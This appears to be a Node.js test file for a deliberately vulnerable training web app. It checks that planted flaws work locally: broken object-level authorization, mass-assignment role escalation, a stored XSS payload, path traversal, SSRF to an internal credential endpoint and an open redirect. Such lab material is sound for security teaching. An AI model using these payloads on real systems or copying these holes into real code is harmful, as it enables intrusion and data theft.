'use strict'

const assert = require('node:assert/strict')
const { after, before, beforeEach, test } = require('node:test')
const { createApp } = require('../server')
const { reset } = require('../data/store')

let server
let origin

before(async () => {
  server = createApp()
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
  origin = `http://127.0.0.1:${server.address().port}`
})

after(async () => {
  await new Promise(resolve => server.close(resolve))
})

beforeEach(reset)

async function request(path, options) {
  const response = await fetch(origin + path, options)
  const text = await response.text()
  return { response, text, json: text ? JSON.parse(text) : null }
}

async function login(email, password) {
  const { json } = await request('/api/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password }),
  })
  return json.token
}

test('seed accounts authenticate and health is reachable', async () => {
  const token = await login('alice', 'alicepass')
  assert.ok(token)
  const { response, json } = await request('/api/health')
  assert.equal(response.status, 200)
  assert.equal(json.ok, true)
})

test('cross-account order read demonstrates the intentional BOLA', async () => {
  const token = await login('alice', 'alicepass')
  const { response, json } = await request('/api/orders/102', {
    headers: { authorization: `Bearer ${token}` },
  })
  assert.equal(response.status, 200)
  assert.equal(json.userId, 2)
})

test('mass assignment demonstrates role escalation', async () => {
  const token = await login('alice', 'alicepass')
  const { json } = await request('/api/users/1', {
    method: 'PATCH',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
    body: JSON.stringify({ role: 'admin' }),
  })
  assert.equal(json.role, 'admin')
})

test('stored XSS, path traversal, SSRF, and open redirect proofs are observable', async () => {
  await request('/api/comments', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ body: '<img src=x onerror=alert(1)>' }),
  })
  const comments = await fetch(origin + '/comments').then(response => response.text())
  assert.match(comments, /onerror=alert/)

  const traversal = await request('/api/files?name=../private-note.txt')
  assert.match(traversal.json.content, /INTERNAL-LAB-NOTE/)

  const ssrf = await request(`/api/fetch?url=${encodeURIComponent(origin + '/internal/metadata')}`)
  assert.match(ssrf.json.body, /temporaryCredential/)

  const redirect = await fetch(origin + '/go?next=https://example.test', { redirect: 'manual' })
  assert.equal(redirect.status, 302)
  assert.equal(redirect.headers.get('location'), 'https://example.test')
})
